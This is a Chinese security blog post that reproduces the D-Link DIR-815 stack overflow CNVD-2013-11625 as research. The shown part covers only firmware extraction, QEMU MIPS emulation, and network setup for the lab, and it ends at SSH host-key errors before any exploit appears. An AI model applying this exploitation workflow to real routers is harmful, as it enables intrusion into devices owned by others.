<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>CNVD-2013-11625复现 | 坠入星野的月🌙</title><meta name="author" content="uf4te"><meta name="copyright" content="uf4te"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="这是第一篇 CVE 复现文章，关于 DIR-815 等路由器的栈溢出漏洞，需要用到 MIPS 架构的 ROP，收获不少，同时也解决了 winmt 大佬的 poc 无法 getshell 的问题，很适合作为 CVE 复现入门"><meta property="og:type" content="article"><meta property="og:title" content="CNVD-2013-11625复现"><meta property="og:url" content="https://www.uf4te.cn/posts/c2233a9.html"><meta property="og:site_name" content="坠入星野的月🌙"><meta property="og:description" content="这是第一篇 CVE 复现文章，关于 DIR-815 等路由器的栈溢出漏洞，需要用到 MIPS 架构的 ROP，收获不少，同时也解决了 winmt 大佬的 poc 无法 getshell 的问题，很适合作为 CVE 复现入门"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.uf4te.cn/img/cover/cover-131.jpg"><meta property="article:published_time" content="2024-06-12T13:03:01.000Z"><meta property="article:modified_time" content="2024-06-22T11:00:56.000Z"><meta property="article:author" content="uf4te"><meta property="article:tag" content="GDB"><meta property="article:tag" content="CVE"><meta property="article:tag" content="IOT"><meta property="article:tag" content="QEMU"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.uf4te.cn/img/cover/cover-131.jpg"><link rel="shortcut icon" href="/img/blog/avatar.jpg"><link rel="canonical" href="https://www.uf4te.cn/posts/c2233a9.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//sdk.51.la"><meta name="baidu-site-verification" content="codeva-b3iLZWQECM"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>!function(t){"use strict";!function(e){var r=window,s=document,n=t,c="".concat("https:"===s.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),i=s.createElement("script"),o=s.getElementsByTagName("script")[0];i.type="text/javascript",i.setAttribute("charset","UTF-8"),i.async=!0,i.src=c,i.id="LA_COLLECT",n.d=i;var a=function(){r.LA.ids.push(n)};r.LA?r.LA.ids&&a():(r.LA=t,r.LA.ids=[],a()),o.parentNode.insertBefore(i,o)}()}({id:"3GoBenqrrrBby5er",ck:"3GoBenqrrrBby5er",hashMode:!0})</script><script>!function(e,t,n,r){var i=t.createElement("script"),o=t.getElementsByTagName("script")[0];i.type="text/javascript",i.crossorigin=!0,i.onload=function(){(new e.LingQue.Monitor).init({id:"3GoBenqrrrBby5er"})},o.parentNode.insertBefore(i,o),i.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script>const GLOBAL_CONFIG={root:"/",algolia:{appId:"XY1UOYTY6S",apiKey:"4f03dfbbbff745c98fa4728e2ca61a96",indexName:"uf4te",hits:{per_page:10},languages:{input_placeholder:"搜索文章",hits_empty:"找不到您查询的内容：${query}",hits_stats:"找到 ${hits} 条结果，用时 ${time} 毫秒"}},localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#323232",bgDark:"#696969",position:"bottom-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!1,rightside:!0}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"CNVD-2013-11625复现",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-06-22 19:00:56"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.getCSS=(e,t=!1)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},document.head.appendChild(a)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/iconfont.css"></head><body><span id="fps"></span><script src="/js/reward.js"></script><script src="https://cdn1.tianli0.top/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload='this.media="screen"'><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="坠入星野的月🌙" type="application/atom+xml"><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='onerror=null,src="/img/404/loading_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>文库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>文章归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>文章标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>文章分类</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>随便逛逛</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont iconfont icon-yinle"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw iconfont icon-shipin"></i> <span>视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw iconfont icon-tupian"></i> <span>图片</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw iconfont icon-youxi"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>我的说说</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友情链接</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>推荐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>实用工具</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>时空之海</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>我的装备</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>言语星空</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>关于本站</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url('/img/blog/default_top_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="坠入星野的月🌙"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg"></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>文库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>文章归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>文章标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>文章分类</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>随便逛逛</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont iconfont icon-yinle"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw iconfont icon-shipin"></i> <span>视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw iconfont icon-tupian"></i> <span>图片</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw iconfont icon-youxi"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>我的说说</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友情链接</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>推荐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>实用工具</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>时空之海</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>我的装备</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>言语星空</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>关于本站</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CNVD-2013-11625复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-sharp fa-regular fa-pen-to-square fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-12T13:03:01.000Z 2024-06-12 21:03:01">2024-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-22T11:00:56.000Z 2024-06-22 19:00:56">2024-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-folder-open fa-fw post-meta-icon"></i> <a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span> <span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span> <span>31分钟</span></span><span class="post-meta-separator">|</span><span data-flag-title="CNVD-2013-11625复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="waline-pageview-count" data-path="/posts/c2233a9.html"><i class="fa-solid fa-spinner fa-spin"></i></span></span> <span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/c2233a9.html#post-comment"><span class="waline-comment-count" data-path="/posts/c2233a9.html"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s58 18 88 18 58-18 88-18 58 18 88 18v44h-352Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CNVD-2013-11625"><a href="#CNVD-2013-11625" class="headerlink" title="CNVD-2013-11625"></a>CNVD-2013-11625</h1><blockquote><p>参考文章：</p><ol><li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></li><li><a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzE4OTkzMjMuaHRtbCNnb29nbGVfdmlnbmV0dGU=">D-Link路由器CNVD-2013-11625缓冲区溢出漏洞复现 | CN-SEC 中文网</a></li></ol></blockquote><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote><p>D-Link DIR-645 <code>"post_login.xml"</code>，<code>"hedwig.cgi"</code>，<code>"authentication.cgi"</code> 不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。</p></blockquote><p>2013 年，D-Link DIR-645 无线路由器被爆出存在缓冲区溢出漏洞，远程攻击者通过向该无线路由器的 <code>"post_login.xml"</code>、<code>"hedwig.cgi"</code>、<code>"authentication.cgi"</code> 等接口提交特制请求即可触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击，漏洞编号为 CNVD-2013-11625</p><p>后经安全研究员分析发现，该漏洞同时影响 D-LINK 的 DIR-815/300/600/645 型号路由器设备</p><p>漏洞详情：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy9zaG93L0NOVkQtMjAxMy0xMTYyNQ==">CNVD-2013-11625 | 国家信息安全漏洞共享平台</a></p><hr><h2 id="复现工具"><a href="#复现工具" class="headerlink" title="复现工具"></a>复现工具</h2><table><thead><tr><th align="left">名称</th><th align="left">版本</th></tr></thead><tbody><tr><td align="left">OS（宿主机）</td><td align="left">Kali Linux 2024.1</td></tr><tr><td align="left">QEMU</td><td align="left">8.2.1</td></tr><tr><td align="left">binwalk</td><td align="left">2.3.3</td></tr><tr><td align="left">GDB &amp; gdbserver</td><td align="left">13.2</td></tr></tbody></table><hr><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><h3 id="QEMU-系统级复现"><a href="#QEMU-系统级复现" class="headerlink" title="QEMU 系统级复现"></a>QEMU 系统级复现</h3><blockquote><p><strong>QEMU 系统级层面的漏洞复现需要我们通过 QEMU 虚拟机仿真路由器系统</strong></p></blockquote><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><blockquote><p>注意：</p><p><strong>对于固件处理和仿真的相关操作，这是本文的前置基础</strong></p><p>如果对本文有任何疑问请先参考本站的《<a href="3fd254db.html">IOT环境搭建与固件分析</a>》和《<a href="f0cbf9ee.html">IOT固件仿真与gdbserver远程调试</a>》这两篇文章</p></blockquote><p>下载受影响的固件版本，这里以 D-LINK DIR-815 路由器为例：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9wbWRhcC5kbGluay5jb20udHcvUE1EL0dldEFnaWxlRmlsZT9pdGVtTnVtYmVyPUZJUjEwMDA0ODcmZmlsZU5hbWU9RElSLTgxNUExX0ZXMTAxU1NCMDMuYmluJmZpbGVTaXplPTM3ODQ4NDQuMA==">DIR-815A1_FW101SSB03.bin</a></p><p>首先使用 <code>binwalk -Me</code> 分离出文件系统：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> ./DIR-815A1_FW101SSB03.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：</p><p>需要提前安装 <code>binwalk</code> 的 <code>sasquatch</code> 工具，否则提取出的 <code>squashfs-root</code> 文件夹是空的</p><p>关于 <code>sasquatch</code> 的安装以及相关报错的处理，见本站《<a href="3fd254db.html">IOT环境搭建与固件分析</a>》一文</p></blockquote><p>提取出路由器的文件系统：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B01.png" alt="CNVD-2013-11625复现1.png"></p><p>通过 <code>busybox</code> 程序查看路由器架构：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B02.png" alt="CNVD-2013-11625复现2.png"></p><p>首先下载 MIPS32 架构的 QEMU 内核和镜像文件：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B03.png" alt="CNVD-2013-11625复现3.png"></p><p>也可以直接通过 <code>wget</code> 下载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2 https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：</p><p>MIPS32 架构有 Debian Squeeze 和 Debian Wheezy 两种镜像：</p><ul><li>Squeeze 中的软件包和库通常比 Wheezy 中的旧，因此 Squeeze 适合运行需要特定旧版本库或依赖的应用程序</li><li>Wheezy 适合需要更好的性能、更好的硬件支持或更新的软件包的场景</li></ul><p>内核镜像文件 <code>vmlinux</code> 有 <code>4kc</code> 和 <code>5kc</code> 两种版本：<strong>4kc 为 32 位，5kc 为 64 位</strong></p><p>另外，与 ARM 架构不同，MIPS32 的仿真没有 RAM 磁盘映像文件 <code>initrd.img</code></p></blockquote><p>使用 <code>qemu-system-mipsel</code> 来启动 QEMU 虚拟机，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-system-mipsel <span class="token punctuation">\</span>
  <span class="token parameter variable">-M</span> malta <span class="token punctuation">\</span>
  <span class="token parameter variable">-kernel</span> ./vmlinux-3.2.0-4-4kc-malta <span class="token punctuation">\</span>
  <span class="token parameter variable">-hda</span> ./debian_squeeze_mipsel_standard.qcow2 <span class="token punctuation">\</span>
  <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/sda1 console=tty0"</span> <span class="token punctuation">\</span>
  <span class="token parameter variable">-net</span> nic <span class="token punctuation">\</span>
  <span class="token parameter variable">-net</span> tap,ifname<span class="token operator">=</span>tap0,script<span class="token operator">=</span>no,downscript<span class="token operator">=</span>no <span class="token punctuation">\</span>
  <span class="token parameter variable">-nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动成功，账号密码都是 <code>root</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B04.png" alt="CNVD-2013-11625复现4.png"></p><p>接下来配置虚拟网卡，在 Kali Linux 中创建一个 <code>net.sh</code> 脚本，并写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">sudo</span> brctl addbr br0                   <span class="token comment"># 添加一座名为 br0 的网桥</span>
<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">192.168</span>.2.3/24 up    <span class="token comment"># 启用 br0 接口</span>
<span class="token function">sudo</span> tunctl <span class="token parameter variable">-t</span> tap0 <span class="token parameter variable">-u</span> root            <span class="token comment"># 创建一个只许 root 访问的 tap0 接口</span>
<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">192.168</span>.2.1/24 up   <span class="token comment"># 启用 tap0 接口</span>
<span class="token function">sudo</span> brctl addif br0 tap0              <span class="token comment"># 在虚拟网桥中增加一个 tap0 接口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>赋予执行权限并运行该脚本：（<em>每次重启 Kali Linux 后都需要重新配置一次</em>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x net.sh
./net.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 QEMU 虚拟机中设置 ip 地址，<strong>注意与&nbsp;<code>tap0</code>&nbsp;在同一网段</strong>：（<em>每次重启 QEMU 虚拟机后都需要重新配置一次</em>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>root@debian-mipsel<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.2.2/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置后 QEMU 虚拟机的 ip 地址为 <code>192.168.2.2</code>，测试一下能否与 Kali Linux 的 <code>192.168.2.1</code> 相互 ping 通：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B05.png" alt="CNVD-2013-11625复现5.png"></p><p>将文件系统打包并通过 <code>scp</code> 命令上传到 QEMU 虚拟机：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czvf</span> DIR-815A1_FW101SSB03_rootfs.tar.gz squashfs-root
<span class="token function">sudo</span> <span class="token function">scp</span> DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B06.png" alt="CNVD-2013-11625复现6.png"></p><p>如果 <code>scp</code> 命令报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Unable to negotiate with <span class="token number">192.168</span>.2.2 port <span class="token number">22</span>: no matching <span class="token function">host</span> key <span class="token builtin class-name">type</span> found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>这表示 SSH 客户端和服务器之间没有匹配的主机密钥类型，通常是因为服务器只支持旧的 <code>ssh-rsa</code> 和 <code>ssh-dss</code> 密钥类型，而 SSH 客户端配置不再接受这些类型的密钥</p></blockquote><p>改用如下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-o</span> <span class="token assign-left variable">HostKeyAlgorithms</span><span class="token operator">=</span>+ssh-rsa DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果继续报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>
Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>
It is also possible that a <span class="token function">host</span> key has just been changed.
The fingerprint <span class="token keyword">for</span> the RSA key sent by the remote <span class="token function">host</span> is
SHA256:tVc2ekHlAJNyIu0Fo9rOvfudWIVfkMpa3FSLlDcGeVQ.
Please contact your system administrator.
Add correct <span class="token function">host</span> key <span class="token keyword">in</span> /root/.ssh/known_hosts to get rid of this message.
Offending ECDSA key <span class="token keyword">in</span> /root/.ssh/known_hosts:1
  remove with:
  ssh-keygen <span class="token parameter variable">-f</span> <span class="token string">'/root/.ssh/known_hosts'</span> <span class="token parameter variable">-R</span> <span class="token string">'192.168.2.2'</span>
Host key <span class="token keyword">for</span> <span class="token number">192.168</span>.2.2 has changed and you have requested strict checking.
Host key verification failed.
